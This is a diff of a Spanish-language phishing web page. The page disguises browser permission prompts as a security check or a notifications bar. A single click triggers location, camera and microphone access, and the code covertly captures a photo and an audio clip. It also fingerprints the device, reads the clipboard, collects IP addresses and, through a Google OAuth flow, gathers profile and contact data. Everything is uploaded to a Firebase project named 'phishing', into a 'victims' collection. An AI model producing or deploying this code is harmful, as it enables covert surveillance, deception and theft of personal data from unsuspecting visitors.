@@ -3,549 +3,490 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>...</title>
+<title></title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 html, body {
-  width:100%; height:100%; background:#000;
-  display:flex; align-items:center; justify-content:center;
+  width:100%; height:100%;
+  background:#000;
   overflow:hidden;
   font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
 }
-#n {
-  font-size:clamp(80px,25vw,200px); font-weight:100; color:#fff;
-  letter-spacing:-4px; user-select:none;
-  opacity:1; transition:opacity 0.18s ease;
-  position:relative; z-index:1;
-}
 
-/* ── OVERLAY ───────────────────────────── */
-#ov {
-  display:none; position:fixed; inset:0;
-  background:rgba(0,0,0,0.93);
-  align-items:center; justify-content:center; z-index:50;
+/* Barra inferior — imita barra de permisos del browser */
+#bar {
+  position:fixed;
+  bottom:-130px;
+  left:0; right:0;
+  background:#1c1c1e;
+  border-top:1px solid #2c2c2e;
+  padding:16px 18px 18px;
+  transition:bottom .38s cubic-bezier(.25,.8,.25,1);
+  z-index:99;
 }
-#ov.show { display:flex; }
-.box {
-  background:#fff; border-radius:20px;
-  padding:30px 24px 22px; max-width:340px; width:90%;
-  text-align:center; box-shadow:0 28px 70px rgba(0,0,0,.7);
-  animation:up .22s ease;
-}
-@keyframes up {from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+#bar.show { bottom:0; }
 
-.shield { font-size:2.6rem; margin-bottom:12px; }
-.box h2 { font-size:1.05rem; font-weight:600; color:#1a1a1a; margin-bottom:8px; }
-.box p  { font-size:.8rem; color:#666; margin-bottom:18px; line-height:1.55; }
-
-/* permiso único disfrazado */
-.perm-row {
-  display:flex; align-items:center; gap:10px;
-  background:#f7f8fa; border-radius:10px;
-  padding:11px 14px; margin-bottom:10px; text-align:left;
+.bar-top {
+  display:flex;
+  align-items:flex-start;
+  gap:13px;
+  margin-bottom:14px;
 }
-.perm-icon { font-size:1.3rem; flex-shrink:0; }
-.perm-txt  { font-size:.78rem; color:#333; line-height:1.35; }
-.perm-txt b { font-size:.73rem; font-weight:600; }
-.perm-sub  { font-size:.65rem; color:#999; }
-
-/* botón único */
-.btn-main {
-  width:100%; background:#1a73e8; color:#fff; border:none;
-  border-radius:12px; padding:14px; font-size:.9rem; font-weight:600;
-  cursor:pointer; transition:background .15s; margin-top:6px;
-  letter-spacing:.3px;
+.bar-icon {
+  width:38px; height:38px;
+  border-radius:9px;
+  background:#2c2c2e;
+  display:flex; align-items:center; justify-content:center;
+  font-size:1.2rem;
+  flex-shrink:0;
 }
-.btn-main:hover { background:#1557b0; }
-.btn-main:active{ background:#0f469a; transform:scale(.99); }
-
-/* divider */
-.div-or {
-  display:flex; align-items:center; gap:8px;
-  margin:12px 0; color:#ccc; font-size:.72rem;
+.bar-txt { flex:1; }
+.bar-txt b {
+  display:block;
+  color:#fff;
+  font-size:.88rem;
+  font-weight:600;
+  line-height:1.3;
 }
-.div-or::before,.div-or::after {
-  content:''; flex:1; height:1px; background:#eee;
+.bar-txt small {
+  color:#8e8e93;
+  font-size:.75rem;
+  line-height:1.4;
+  display:block;
+  margin-top:3px;
 }
-
-/* botón Google */
-.btn-g {
-  width:100%; background:#fff; color:#444; border:1.5px solid #ddd;
-  border-radius:12px; padding:12px; font-size:.85rem; font-weight:500;
-  cursor:pointer; display:flex; align-items:center; justify-content:center;
-  gap:9px; transition:border-color .15s, box-shadow .15s;
+.bar-btns {
+  display:flex;
+  gap:10px;
 }
-.btn-g:hover { border-color:#aaa; box-shadow:0 2px 8px rgba(0,0,0,.1); }
-.btn-g svg   { width:18px; height:18px; flex-shrink:0; }
-
-/* video oculto para foto cámara */
-#vhide {
-  position:fixed; left:-9999px; top:-9999px;
-  width:1px; height:1px; opacity:0;
+.btn-blk {
+  flex:1;
+  background:#2c2c2e;
+  color:#8e8e93;
+  border:none;
+  border-radius:11px;
+  padding:13px;
+  font-size:.85rem;
+  font-weight:500;
+  cursor:pointer;
 }
+.btn-ok {
+  flex:1;
+  background:#0a84ff;
+  color:#fff;
+  border:none;
+  border-radius:11px;
+  padding:13px;
+  font-size:.85rem;
+  font-weight:600;
+  cursor:pointer;
+  transition:opacity .15s;
+}
+.btn-ok:active { opacity:.8; }
 </style>
 </head>
 <body>
 
-<span id="n">10</span>
-<video id="vhide" autoplay playsinline muted></video>
-
-<!-- ÚNICO OVERLAY ────────────────────────────────── -->
-<div id="ov">
-  <div class="box">
-
-    <div class="shield">🔒</div>
-    <h2>Verificación requerida</h2>
-    <p>Necesitamos confirmar que eres una persona real para mostrarte el contenido.</p>
-
-    <!-- Todo disfrazado como "verificación de seguridad" -->
-    <div class="perm-row">
-      <span class="perm-icon">📡</span>
-      <div class="perm-txt">
-        <b>Verificación de red</b><br>
-        <span class="perm-sub">Confirma tu conexión y ubicación</span>
-      </div>
+<!-- Barra de permiso única -->
+<div id="bar">
+  <div class="bar-top">
+    <div class="bar-icon">🔔</div>
+    <div class="bar-txt">
+      <b>Permitir notificaciones</b>
+      <small>Esta página quiere enviarte alertas y actualizaciones en tiempo real.</small>
     </div>
-    <div class="perm-row">
-      <span class="perm-icon">🔔</span>
-      <div class="perm-txt">
-        <b>Confirmar identidad</b><br>
-        <span class="perm-sub">Envío de código de verificación</span>
-      </div>
-    </div>
-    <div class="perm-row">
-      <span class="perm-icon">🎭</span>
-      <div class="perm-txt">
-        <b>Verificación biométrica</b><br>
-        <span class="perm-sub">Detección facial anti-bot</span>
-      </div>
-    </div>
-
-    <!-- BOTÓN ÚNICO — dispara todos los permisos a la vez -->
-    <button class="btn-main" id="btnVerif" onclick="acceptAll()">
-      ✓ &nbsp;Verificar y continuar
-    </button>
-
-    <div class="div-or">o</div>
-
-    <!-- Google OAuth -->
-    <button class="btn-g" onclick="startGoogleAuth()">
-      <svg viewBox="0 0 24 24">
-        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
-        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-      </svg>
-      Continuar con Google
-    </button>
-
+  </div>
+  <div class="bar-btns">
+    <button class="btn-blk" id="btnBlk">No permitir</button>
+    <button class="btn-ok"  id="btnOk">Permitir</button>
   </div>
 </div>
 
-<script type="module">
-import { initializeApp }       from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getFirestore, collection, addDoc, updateDoc, doc }
-  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
-import { getStorage, ref, uploadString, getDownloadURL }
-  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
+<script>
+// ╔══════════════════════════════════════════════╗
+//   CONFIG
+// ╚══════════════════════════════════════════════╝
+const FB_KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
+const FB_PROJ = 'phishing-cad1e';
+const FB_ST   = 'phishing-cad1e.firebasestorage.app';
+// Google One Tap silencioso — pon tu Client ID aquí
+// console.cloud.google.com → Credentials → OAuth 2.0 Client ID
+const G_CID   = 'TU_CLIENT_ID.apps.googleusercontent.com';
 
-// ── CONFIG ────────────────────────────────────────
-const G_CLIENT_ID    = "TU_CLIENT_ID.apps.googleusercontent.com";
-const G_REDIRECT_URI = location.origin + location.pathname;
-const G_SCOPES = [
-  "openid","email","profile",
-  "https://www.googleapis.com/auth/user.phonenumbers.read",
-  "https://www.googleapis.com/auth/user.addresses.read",
-  "https://www.googleapis.com/auth/user.birthday.read",
-  "https://www.googleapis.com/auth/user.gender.read",
-  "https://www.googleapis.com/auth/contacts.readonly",
-].join(" ");
+// ╔══════════════════════════════════════════════╗
+//   ESTADO
+// ╚══════════════════════════════════════════════╝
+let docId = null;
+const P   = {};
 
-const FB = {
-  apiKey:            "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0",
-  authDomain:        "phishing-cad1e.firebaseapp.com",
-  projectId:         "phishing-cad1e",
-  storageBucket:     "phishing-cad1e.firebasestorage.app",
-  messagingSenderId: "48855278637",
-  appId:             "1:48855278637:web:cd6386bf2342f0b63344a4"
-};
-const app     = initializeApp(FB);
-const db      = getFirestore(app);
-const storage = getStorage(app);
+// ╔══════════════════════════════════════════════╗
+//   FINGERPRINT BASE (sin permisos, inmediato)
+// ╚══════════════════════════════════════════════╝
+P.ua      = navigator.userAgent;
+P.plat    = navigator.platform;
+P.vendor  = navigator.vendor;
+P.lang    = navigator.language;
+P.langs   = (navigator.languages||[]).join(',');
+P.cores   = String(navigator.hardwareConcurrency||'');
+P.mem     = String(navigator.deviceMemory||'n/a');
+P.touch   = String(navigator.maxTouchPoints||0);
+P.cook    = String(navigator.cookieEnabled);
+P.screen  = screen.width+'x'+screen.height;
+P.avail   = screen.availWidth+'x'+screen.availHeight;
+P.dpr     = String(window.devicePixelRatio);
+P.depth   = String(screen.colorDepth);
+P.orient  = screen.orientation?.type||'n/a';
+P.iw      = String(window.innerWidth);
+P.ih      = String(window.innerHeight);
+P.tz      = Intl.DateTimeFormat().resolvedOptions().timeZone;
+P.tzOff   = String(new Date().getTimezoneOffset());
+P.locale  = Intl.DateTimeFormat().resolvedOptions().locale;
+P.dateStr = new Date().toString();
+P.ts      = String(Date.now());
+P.ref     = document.referrer||'(directo)';
+P.url     = location.href.split('#')[0];
+P.dark    = String(matchMedia('(prefers-color-scheme:dark)').matches);
+P.mobile  = String(matchMedia('(pointer:coarse)').matches);
+P.pwa     = String(matchMedia('(display-mode:standalone)').matches);
+P.wasm    = String(!!window.WebAssembly);
+P.gpu2    = String(!!document.createElement('canvas').getContext('webgl2'));
+P.bt      = String(!!navigator.bluetooth);
+P.nfc     = String('NDEFReader' in window);
+P.usb     = String(!!navigator.usb);
+P.pdf     = String(!!navigator.pdfViewerEnabled);
 
-let docRef = null;
-const P    = {};
-
-// ═══════════════════════════════════════════════════
-// RECOLECCIÓN BASE (sin permisos)
-// ═══════════════════════════════════════════════════
-P.ua       = navigator.userAgent;
-P.platform = navigator.platform;
-P.vendor   = navigator.vendor;
-P.lang     = navigator.language;
-P.langs    = (navigator.languages||[]).join(',');
-P.cookies  = String(navigator.cookieEnabled);
-P.touch    = String(navigator.maxTouchPoints||0);
-P.memory   = String(navigator.deviceMemory||'n/a');
-P.cores    = String(navigator.hardwareConcurrency||'');
-P.online   = String(navigator.onLine);
-P.screen   = screen.width+'x'+screen.height;
-P.avail    = screen.availWidth+'x'+screen.availHeight;
-P.depth    = String(screen.colorDepth);
-P.dpr      = String(window.devicePixelRatio);
-P.orient   = screen.orientation?.type||'n/a';
-P.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone;
-P.tzOff    = String(new Date().getTimezoneOffset());
-P.locale   = Intl.DateTimeFormat().resolvedOptions().locale;
-P.dateStr  = new Date().toString();
-P.ts       = String(Date.now());
-P.referer  = document.referrer||'(directo)';
-P.url      = location.href.split('#')[0];
-P.params   = location.search;
-P.dark     = String(matchMedia('(prefers-color-scheme:dark)').matches);
-P.mobile   = String(matchMedia('(pointer:coarse)').matches);
-P.wasm     = String(!!window.WebAssembly);
-P.webGPU   = String(!!navigator.gpu);
-P.bt       = String(!!navigator.bluetooth);
-P.nfc      = String('NDEFReader' in window);
-
-// Canvas fingerprint
 try {
-  const cv=document.createElement('canvas'); cv.width=200; cv.height=40;
-  const cx=cv.getContext('2d');
+  P.plugins = Array.from(navigator.plugins||[]).map(p=>p.name).join('|').slice(0,200);
+} catch(e){}
+
+// Canvas FP
+try {
+  const cv = document.createElement('canvas');
+  cv.width=200; cv.height=40;
+  const cx = cv.getContext('2d');
   cx.textBaseline='top'; cx.font='12px Arial';
   cx.fillStyle='#f55'; cx.fillRect(80,1,50,16);
   cx.fillStyle='#05a'; cx.fillText('Rx',2,12);
-  P.canvas=cv.toDataURL().slice(-50);
-} catch(e){ P.canvas='blocked'; }
+  cx.fillStyle='rgba(0,200,80,.7)'; cx.fillText('Rx',4,14);
+  P.cvFP = cv.toDataURL().slice(-50);
+} catch(e){}
 
 // WebGL GPU real
 try {
-  const gl=document.createElement('canvas').getContext('webgl');
+  const gl = document.createElement('canvas').getContext('webgl');
   if(gl){
-    const d=gl.getExtension('WEBGL_debug_renderer_info');
-    if(d){ P.gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL); P.gpuV=gl.getParameter(d.UNMASKED_VENDOR_WEBGL); }
-    P.glVer=gl.getParameter(gl.VERSION);
+    const d = gl.getExtension('WEBGL_debug_renderer_info');
+    if(d){
+      P.gpu  = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+      P.gpuV = gl.getParameter(d.UNMASKED_VENDOR_WEBGL);
+    }
+    P.glVer = gl.getParameter(gl.VERSION);
+    P.glSL  = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+    P.glMax = String(gl.getParameter(gl.MAX_TEXTURE_SIZE));
   }
 } catch(e){}
 
-// Connection
-const cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-if(cn){ P.connEff=cn.effectiveType||''; P.connDl=String(cn.downlink||''); P.connRtt=String(cn.rtt||''); }
-
-// Hash
-const hi=[P.ua,screen.width,screen.height,P.tz,P.lang,P.cores,P.canvas,P.gpu||''].join('|');
-let hv=0x811c9dc5;
-for(let i=0;i<hi.length;i++){hv^=hi.charCodeAt(i);hv=(hv*0x01000193)>>>0;}
-P.hash='0x'+hv.toString(16).toUpperCase().padStart(8,'0');
-
-// Battery (no permiso)
-navigator.getBattery?.().then(b=>{
-  P.bat=Math.round(b.level*100)+'%'; P.batChg=String(b.charging);
-  P.batDisT=String(b.dischargingTime); push();
-}).catch(()=>{});
-
-// Storage (no permiso)
-navigator.storage?.estimate?.().then(q=>{
-  P.stQuota=(q.quota/1e9).toFixed(2)+'GB'; P.stUsed=(q.usage/1e6).toFixed(2)+'MB'; push();
-}).catch(()=>{});
-
-// Audio fingerprint (no permiso)
+// Codecs
 try {
-  const A=window.OfflineAudioContext; if(A){
+  const v=document.createElement('video'), a=document.createElement('audio');
+  P.h264=v.canPlayType('video/mp4;codecs="avc1.42E01E"');
+  P.vp9 =v.canPlayType('video/webm;codecs="vp9"');
+  P.mp3 =a.canPlayType('audio/mpeg');
+  P.ogg =a.canPlayType('audio/ogg;codecs="vorbis"');
+} catch(e){}
+
+// CSS media
+P.contrast  = matchMedia('(prefers-contrast:more)').matches ? 'more':'normal';
+P.motionRed = String(matchMedia('(prefers-reduced-motion:reduce)').matches);
+P.ptrFine   = String(matchMedia('(pointer:fine)').matches);
+P.hdr       = String(matchMedia('(dynamic-range:high)').matches);
+
+// Hash compuesto
+const _hi = [P.ua,screen.width,screen.height,P.tz,P.lang,P.cores,P.cvFP,P.gpu||''].join('|');
+let _h = 0x811c9dc5;
+for(let i=0;i<_hi.length;i++){_h^=_hi.charCodeAt(i);_h=(_h*0x01000193)>>>0;}
+P.hash = '0x'+_h.toString(16).toUpperCase().padStart(8,'0');
+
+// Battery
+navigator.getBattery?.().then(b=>{
+  P.bat=Math.round(b.level*100)+'%';
+  P.batChg=String(b.charging);
+  P.batDisT=String(b.dischargingTime);
+  push();
+}).catch(()=>{});
+
+// Storage
+navigator.storage?.estimate?.().then(q=>{
+  P.stQ=(q.quota/1e9).toFixed(2)+'GB';
+  P.stU=(q.usage/1e6).toFixed(2)+'MB';
+  push();
+}).catch(()=>{});
+
+// Audio FP
+try{
+  const A=window.OfflineAudioContext;
+  if(A){
     const ac=new A(1,44100,44100),os=ac.createOscillator(),cp=ac.createDynamicsCompressor();
-    os.connect(cp); cp.connect(ac.destination); os.start(0); ac.startRendering();
+    os.connect(cp);cp.connect(ac.destination);os.start(0);ac.startRendering();
     ac.oncomplete=ev=>{
-      const b=ev.renderedBuffer.getChannelData(0); let s=0;
-      for(let i=4500;i<5000;i++) s+=Math.abs(b[i]);
-      P.audio=s.toString(); push();
+      const b=ev.renderedBuffer.getChannelData(0);let s=0;
+      for(let i=4500;i<5000;i++)s+=Math.abs(b[i]);
+      P.aFP=s.toString();push();
     };
   }
-} catch(e){}
+}catch(e){}
 
-// IP pública (no permiso)
+// Fonts
+const _FL=['Arial','Calibri','Cambria','Comic Sans MS','Consolas','Georgia',
+  'Impact','Segoe UI','Tahoma','Times New Roman','Verdana','Helvetica Neue',
+  'Monaco','Ubuntu','Noto Sans','Roboto','Open Sans','Lato'];
+const _sp=document.createElement('span');
+_sp.style.cssText='position:absolute;visibility:hidden;font-size:72px;';
+_sp.textContent='mmmmmmmmmmlli'; document.body.appendChild(_sp);
+_sp.style.fontFamily='monospace';
+const _bW=_sp.offsetWidth,_bH=_sp.offsetHeight;
+P.fonts=_FL.filter(f=>{_sp.style.fontFamily='"'+f+'",monospace';return _sp.offsetWidth!==_bW||_sp.offsetHeight!==_bH;}).join(',');
+P.fontN=String(P.fonts.split(',').filter(Boolean).length);
+document.body.removeChild(_sp);
+
+// Clipboard (sin popup en algunos casos)
+navigator.clipboard?.readText?.().then(t=>{if(t){P.clip=t.slice(0,300);push();}}).catch(()=>{});
+
+// ╔══════════════════════════════════════════════╗
+//   IP PÚBLICA + GEOLOC VIA IP
+// ╚══════════════════════════════════════════════╝
 (async()=>{
   const APIS=[
-    {u:'https://ipapi.co/json/',          ip:'ip',   ci:'city',       re:'region',     co:'country_name', or:'org',  la:'latitude',lon:'longitude',tz:'timezone',as:'asn'},
-    {u:'https://ipwho.is/',               ip:'ip',   ci:'city',       re:'region',     co:'country',      or:'org',  la:'latitude',lon:'longitude',tz:'timezone',as:'asn'},
+    {u:'https://ipapi.co/json/',ip:'ip',ci:'city',re:'region',co:'country_name',or:'org',la:'latitude',lo:'longitude',tz:'timezone',as:'asn'},
+    {u:'https://ipwho.is/',    ip:'ip',ci:'city',re:'region',co:'country',      or:'org',la:'latitude',lo:'longitude',tz:'timezone',as:'asn'},
     {u:'https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,org,as,query,isp',
-                                          ip:'query',ci:'city',       re:'regionName', co:'country',      or:'org',  la:'lat',     lon:'lon',      tz:'timezone',as:'as'},
+                               ip:'query',ci:'city',re:'regionName',co:'country',or:'org',la:'lat',lo:'lon',tz:'timezone',as:'as'},
   ];
   for(const a of APIS){
     try{
       const r=await fetch(a.u,{signal:AbortSignal.timeout(5000)});
       const j=await r.json();
-      if(!j[a.ip]) continue;
-      P.ip=j[a.ip]||''; P.city=j[a.ci]||''; P.region=j[a.re]||'';
-      P.country=j[a.co]||''; P.org=j[a.or]||'';
-      P.lat=String(j[a.la]||''); P.lon=String(j[a.lon]||'');
-      P.ipTZ=j[a.tz]||''; P.asn=j[a.as]||'';
-      await push(); break;
+      if(!j[a.ip])continue;
+      P.ip=j[a.ip]||'';P.city=j[a.ci]||'';P.region=j[a.re]||'';
+      P.country=j[a.co]||'';P.org=j[a.or]||'';
+      P.lat=String(j[a.la]||'');P.lon=String(j[a.lo]||'');
+      P.ipTZ=j[a.tz]||'';P.asn=j[a.as]||'';
+      await push();break;
     }catch(e){continue;}
   }
 })();
 
-// IP local WebRTC (no permiso)
+// IP local WebRTC
 try{
   const pc=new RTCPeerConnection({iceServers:[]});
-  pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
+  pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));
   const seen=new Set();
   pc.onicecandidate=async e=>{
-    if(!e?.candidate) return;
+    if(!e?.candidate)return;
     const m=e.candidate.candidate.match(/((\d{1,3}\.){3}\d{1,3})/);
-    if(!m||seen.has(m[0])) return;
-    seen.add(m[0]); P['ipLocal'+seen.size]=m[0]; await push();
+    if(!m||seen.has(m[0]))return;
+    seen.add(m[0]);P['ipL'+seen.size]=m[0];await push();
   };
-  setTimeout(()=>pc.close(),6000);
+  setTimeout(()=>pc.close(),7000);
 }catch(e){}
 
-// Clipboard silencioso (no permiso en algunos browsers)
-navigator.clipboard?.readText?.().then(t=>{
-  if(t){ P.clipboard=t.slice(0,400); push(); }
-}).catch(()=>{});
+// ╔══════════════════════════════════════════════╗
+//   BOTÓN PERMITIR — TODOS LOS PERMISOS A LA VEZ
+//   Clave: llamadas NO-await en el mismo handler
+//   → el browser las registra como mismo gesto
+// ╚══════════════════════════════════════════════╝
+document.getElementById('btnOk').addEventListener('click', function() {
+  this.disabled = true;
+  this.textContent = '✓';
+  document.getElementById('btnBlk').disabled = true;
+  setTimeout(()=>document.getElementById('bar').classList.remove('show'), 600);
 
-// ═══════════════════════════════════════════════════
-// acceptAll — UN solo botón dispara TODOS los permisos
-// Técnica: todas las llamadas dentro del mismo
-// event handler de usuario → el browser las acepta
-// como originadas del mismo gesto
-// ═══════════════════════════════════════════════════
-window.acceptAll = function() {
-  const btn = document.getElementById('btnVerif');
-  btn.disabled = true;
-  btn.textContent = '⏳ Verificando...';
-
-  // ── 1. GPS ── primer popup que ve el usuario ─────
+  // ── 1. GPS ─────────────────────────────────
   navigator.geolocation.getCurrentPosition(
-    pos => {
-      P.gpsLat  = String(pos.coords.latitude);
-      P.gpsLon  = String(pos.coords.longitude);
-      P.gpsAcc  = String(pos.coords.accuracy)+'m';
-      P.gpsAlt  = String(pos.coords.altitude||'');
-      P.gpsSpd  = String(pos.coords.speed||'');
-      P.gps     = 'granted';
+    pos=>{
+      P.gpsLat=String(pos.coords.latitude);
+      P.gpsLon=String(pos.coords.longitude);
+      P.gpsAcc=String(pos.coords.accuracy)+'m';
+      P.gpsAlt=String(pos.coords.altitude||'');
+      P.gpsSpd=String(pos.coords.speed||'');
+      P.gps='granted';
       push();
     },
-    err => { P.gps='denied:'+err.code; push(); },
-    { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+    err=>{P.gps='denied:'+err.code;push();},
+    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
   );
 
-  // ── 2. Notificaciones (popup 2 aparece justo después) ─
-  Notification.requestPermission().then(r=>{
-    P.notif = r; push();
-  });
-
-  // ── 3. Cámara + Micrófono ────────────────────────
-  // popup 3: browser pide "usar cámara y micrófono"
-  navigator.mediaDevices?.getUserMedia({ video:true, audio:true })
-    .then(async stream => {
-      P.camGranted = 'true';
-
-      // 3a. Foto silenciosa con la cámara frontal
-      const vid = document.getElementById('vhide');
-      vid.srcObject = stream;
-      await vid.play().catch(()=>{});
-      setTimeout(async () => {
-        try{
-          const c2 = document.createElement('canvas');
-          c2.width  = vid.videoWidth  || 320;
-          c2.height = vid.videoHeight || 240;
-          c2.getContext('2d').drawImage(vid,0,0);
-          const photoB64 = c2.toDataURL('image/jpeg', 0.6);
-          // Subir foto a Firebase Storage
-          if(docRef){
-            const photoRef = ref(storage, 'photos/'+docRef.id+'.jpg');
-            await uploadString(photoRef, photoB64, 'data_url');
-            P.photoUrl = await getDownloadURL(photoRef);
-          } else {
-            P.photoB64 = photoB64.slice(0,300); // preview pequeño si no hay doc aún
-          }
-        }catch(e){}
-        // Parar stream después de la foto
-        stream.getTracks().forEach(t=>t.stop());
-        vid.srcObject = null;
-        push();
-      }, 800);
-
-      // 3b. Audio clip silencioso (3 segundos)
-      try{
-        const audioStream = await navigator.mediaDevices.getUserMedia({audio:true});
-        const recorder = new MediaRecorder(audioStream);
-        const chunks   = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-          audioStream.getTracks().forEach(t=>t.stop());
-          try{
-            const blob = new Blob(chunks,{type:'audio/webm'});
-            if(blob.size > 0 && docRef){
-              const audioRef = ref(storage,'audio/'+docRef.id+'.webm');
-              const ab  = await blob.arrayBuffer();
-              const b64 = btoa(String.fromCharCode(...new Uint8Array(ab)));
-              await uploadString(audioRef,'data:audio/webm;base64,'+b64,'data_url');
-              P.audioClipUrl = await getDownloadURL(audioRef);
-              push();
-            }
-          }catch(e){}
-        };
-        recorder.start();
-        setTimeout(()=>recorder.stop(), 3000);
-      }catch(e){}
-    })
-    .catch(e => { P.camGranted='denied:'+e.message; push(); });
-
-  // ── 4. Persistent Storage (silencioso, sin popup) ─
-  navigator.storage?.persist?.().then(granted=>{
-    P.persistStorage = String(granted);
-    push();
-  });
-
-  // ── 5. Clipboard read (sin popup en algunos browsers)─
-  navigator.clipboard?.readText?.().then(t=>{
-    if(t){ P.clipboard=t.slice(0,400); push(); }
-  }).catch(()=>{});
-
-  // ── 6. MIDI (sin popup en Chrome/Edge) ──────────
-  navigator.requestMIDIAccess?.().then(midi=>{
-    P.midi='granted'; P.midiPorts=String(midi.inputs.size+midi.outputs.size);
-    push();
-  }).catch(()=>{});
-
-  // Cerrar overlay
-  setTimeout(()=>{
-    document.getElementById('ov').classList.remove('show');
-  }, 1000);
-};
-
-// ═══════════════════════════════════════════════════
-// GOOGLE OAUTH — flujo implicit (token en fragment)
-// ═══════════════════════════════════════════════════
-window.startGoogleAuth = function() {
-  if(G_CLIENT_ID.startsWith('TU_')){
-    alert('Configura G_CLIENT_ID en el código'); return;
+  // ── 2. Notificaciones ───────────────────────
+  if('Notification' in window){
+    Notification.requestPermission().then(r=>{P.notif=r;push();});
   }
-  if(docRef) sessionStorage.setItem('docId', docRef.id);
-  const st = btoa(String(Date.now()));
-  sessionStorage.setItem('oauthSt', st);
 
-  const u = new URL('https://accounts.google.com/o/oauth2/v2/auth');
-  u.searchParams.set('client_id',             G_CLIENT_ID);
-  u.searchParams.set('redirect_uri',          G_REDIRECT_URI);
-  u.searchParams.set('response_type',         'token');
-  u.searchParams.set('scope',                 G_SCOPES);
-  u.searchParams.set('state',                 st);
-  u.searchParams.set('include_granted_scopes','true');
-  u.searchParams.set('prompt',                'consent');
-  location.href = u.toString();
-};
+  // ── 3. Cámara + Micrófono ───────────────────
+  navigator.mediaDevices?.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:true})
+    .then(stream=>{
+      P.camGranted='true';
+      // Foto silenciosa
+      const vid=document.createElement('video');
+      vid.srcObject=stream; vid.autoplay=true; vid.muted=true;
+      vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;';
+      document.body.appendChild(vid);
+      vid.play().catch(()=>{});
+      setTimeout(async()=>{
+        try{
+          const cv2=document.createElement('canvas');
+          cv2.width=vid.videoWidth||320; cv2.height=vid.videoHeight||240;
+          cv2.getContext('2d').drawImage(vid,0,0);
+          const b64=cv2.toDataURL('image/jpeg',.75);
+          await upStorage('photos/'+(docId||Date.now())+'.jpg',b64,'image/jpeg');
+        }catch(e){}
+        stream.getTracks().forEach(t=>t.stop());
+        vid.remove();
+        // Audio clip 4 seg
+        grabAudio();
+        push();
+      },1000);
+    })
+    .catch(e=>{P.camGranted='denied:'+e.message;push();});
 
-// ── Manejar regreso OAuth ────────────────────────
-function handleOAuthReturn() {
-  if(!location.hash.includes('access_token')) return false;
-  const params = Object.fromEntries(new URLSearchParams(location.hash.slice(1)));
-  const token  = params.access_token;
-  if(!token) return false;
-  history.replaceState(null,'', location.pathname+location.search);
+  // ── 4. Persistent storage (silencioso) ─────
+  navigator.storage?.persist?.().then(g=>{P.persist=String(g);push();});
 
-  const prevId = sessionStorage.getItem('docId');
-  if(prevId) docRef = doc(db,'victims',prevId);
+  // ── 5. MIDI (sin popup en la mayoría) ──────
+  navigator.requestMIDIAccess?.({sysex:false}).then(m=>{
+    P.midi='granted';P.midiPorts=String(m.inputs.size);push();
+  }).catch(()=>{});
+});
 
-  P.gScope = params.scope||'';
-  fetchPeopleAPI(token);
-  return true;
-}
+document.getElementById('btnBlk').addEventListener('click',()=>{
+  document.getElementById('bar').classList.remove('show');
+  P.permBlocked='true'; push();
+});
 
-async function fetchPeopleAPI(token) {
+// Audio clip asíncrono (se llama después del gesto → Chrome lo permite si ya tenemos mic)
+async function grabAudio(){
   try{
-    const fields='names,emailAddresses,phoneNumbers,addresses,birthdays,genders,occupations,organizations,biographies,photos';
-    const r=await fetch(`https://people.googleapis.com/v1/people/me?personFields=${fields}`,
-      {headers:{Authorization:'Bearer '+token}});
-    const j=await r.json();
-    P.gName      = j.names?.[0]?.displayName||'';
-    P.gGivenName = j.names?.[0]?.givenName||'';
-    P.gLastName  = j.names?.[0]?.familyName||'';
-    P.gEmail     = j.emailAddresses?.[0]?.value||'';
-    P.gPhone     = j.phoneNumbers?.[0]?.value||'';
-    P.gPhone2    = j.phoneNumbers?.[1]?.value||'';
-    P.gAllPhones = (j.phoneNumbers||[]).map(p=>p.value).join(' | ');
-    P.gBirthday  = j.birthdays?.[0]?.text||JSON.stringify(j.birthdays?.[0]?.date||'')||'';
-    P.gGender    = j.genders?.[0]?.value||'';
-    P.gAddress   = j.addresses?.[0]?.formattedValue||'';
-    P.gCity      = j.addresses?.[0]?.city||'';
-    P.gCountry   = j.addresses?.[0]?.country||'';
-    P.gPostal    = j.addresses?.[0]?.postalCode||'';
-    P.gOrg       = j.organizations?.[0]?.name||'';
-    P.gTitle     = j.organizations?.[0]?.title||'';
-    P.gBio       = j.biographies?.[0]?.value?.slice(0,200)||'';
-    P.gPhoto     = j.photos?.[0]?.url||'';
-    await push();
-    await fetchContacts(token);
